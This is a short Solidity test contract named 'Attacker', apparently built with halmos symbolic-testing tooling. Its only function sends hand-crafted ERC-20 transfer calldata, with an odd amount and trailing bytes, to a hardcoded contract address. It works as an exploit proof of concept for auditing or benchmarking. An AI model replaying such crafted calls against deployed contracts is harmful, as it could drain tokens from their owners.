// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "../../lib/halmos-cheatcodes/src/SymTest.sol";
import "forge-std/Test.sol";

contract Attacker is Test, SymTest {
	function attack() public {
        address target = address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b);
        bytes memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000";
        target.call(data);
    }
}